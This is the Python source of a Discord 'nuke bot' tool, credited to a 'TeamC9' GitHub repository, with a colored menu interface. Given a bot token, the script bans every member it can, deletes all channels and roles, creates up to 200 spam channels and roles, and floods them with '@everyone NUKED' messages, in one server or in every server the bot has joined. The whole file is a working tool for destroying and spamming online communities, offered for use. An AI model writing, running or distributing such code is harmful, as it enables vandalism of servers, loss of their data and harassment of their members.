import discord
from discord.ext import commands
from colorama import init, Fore as cc
from os import name as os_name, system
from sys import exit

init()
dr = DR = r = R = cc.LIGHTRED_EX
g = G = cc.LIGHTGREEN_EX
b = B = cc.LIGHTBLUE_EX
m = M = cc.LIGHTMAGENTA_EX
c = C = cc.LIGHTCYAN_EX
y = Y = cc.LIGHTYELLOW_EX
w = W = cc.RESET

clear = lambda: system('cls') if os_name == 'nt' else system('clear')
def _input(text):
    print(text, end='')
    return input()

baner = f'''
{r} _   _       _       {m} ____        _   
{r}| \ | |_   _| | _____{m}| __ )  ___ | |_ 
{r}|  \| | | | | |/ / _ {m}\  _ \ / _ \| __|
{r}| |\  | |_| |   <  __{m}/ |_) | (_) | |_ 
{r}|_| \_|\__,_|_|\_\___{m}|____/ \___/ \__|
{y}Made by: {g}https://github.com/itzC9/Bot-Nuker/'''

async def delete_all_channel(guild):
    deleted = 0
    for channel in guild.channels:
        try:
            await channel.delete()
            deleted += 1
        except:
            continue
    return deleted

async def delete_all_roles(guild):
    deleted = 0
    for role in guild.roles:
        try:
            await role.delete()
            deleted += 1
        except:
            continue
    return deleted

async def ban_all_members(guild):
    banned = 0
    for member in guild.members:
        try:
            await member.ban()
            banned += 1
        except:
            continue
    return banned

async def create_roles(guild, name):
    created = 0
    for _ in range(200 - len(guild.roles)):
        try:
            await guild.create_role(name=name)
            created += 1
        except:
            continue
    return created

async def send_messages_to_channels(guild, name):
    sent_messages = 0
    for channel in guild.text_channels:
        if channel.name == name:
            for _ in range(200):
                try:
                    await channel.send("@everyone NUKED BY 🤡**TeamC9**🤡")
                    sent_messages += 1
                except Exception as e:
                    print(f'Error sending message to {channel.name}: {e}')
                    continue
    return sent_messages

async def create_text_channels(guild, name):
    created = 0
    for _ in range(200 - len(guild.channels)):
        try:
            await guild.create_text_channel(name=name)
            created += 1
        except:
            continue
    return created

async def nuke_guild(guild, name):
    print(f'{r}Nuke: {m}{guild.name}')
    banned = await ban_all_members(guild)
    print(f'{m}Banned:{b}{banned}')
    deleted_channels = await delete_all_channel(guild)
    print(f'{m}Deleted Channels:{b}{deleted_channels}')
    deleted_roles = await delete_all_roles(guild)
    print(f'{m}Deleted Roles:{b}{deleted_roles}')
    created_channels = await create_text_channels(guild, name)
    print(f'{m}Created Text Channels:{b}{created_channels}')
    sent_messages = await send_messages_to_channels(guild, name)
    print(f'{m}Sent Messages:{b}{sent_messages}')
    print(f'{r}--------------------------------------------\n\n')

while True:
    clear()
    choice = input(f'''   
{baner}                
{c}--------------------------------------------
{b}[Menu]
    {y}└─[1] {m}- {g}Run Setup Nuke Bot
    {y}└─[2] {m}- {g}Exit
{y}====>{g}''')
    if choice == '1':
        token = _input(f'{y}Input bot token:{g}')
        name = _input(f'{y}Input name for created channels / roles:{g}')
        clear()
        choice_type = _input(f'''
{baner}                
{c}--------------------------------------------
{b}[Select]
    {y}└─[1] {m}- {g}Nuke all servers.
    {y}└─[2] {m}- {g}Nuke only one server.  
    {y}└─[3] {m}- {g}Exit
{y}====>{g}''')
        client = commands.Bot(command_prefix='.', intents=discord.Intents.all())
        if choice_type == '1':
            @client.event
            async def on_ready():
                print(f'''
[+]Logged in as {client.user.name}
[+]Bot in {len(client.guilds)} servers!''')
                for guild in client.guilds:
                    await nuke_guild(guild, name)
                await client.close()
        elif choice_type == '2':
            guild_id = _input(f'{y}Input server id:{g}')
            @client.event
            async def on_ready():
                for guild in client.guilds:
                    if str(guild.id) == guild_id:
                        await nuke_guild(guild, name)
                await client.close()
        elif choice_type == '3':
            print(f'{dr}Exit...')
            exit()
        try:
            client.run(token)
            input('Nuke finished, press enter to return to menu...')
        except Exception as error:
            if str(error) == "Shard ID None is requesting privileged intents that have not been explicitly enabled in the developer portal. It is recommended to go to https://discord.com/developers/applications/ and explicitly enable the privileged intents within your application's page. If this is not possible, then consider disabling the privileged intents instead.":
                input(f'{r}Intents Error\n{g}For fix -> https://prnt.sc/wmrwut\n{b}Press enter to return...')
            else:
                input(f'{r}{error}\n{b}Press enter to return...')
            continue
    elif choice == '2':
        print(f'{dr}Exit...')
        exit()
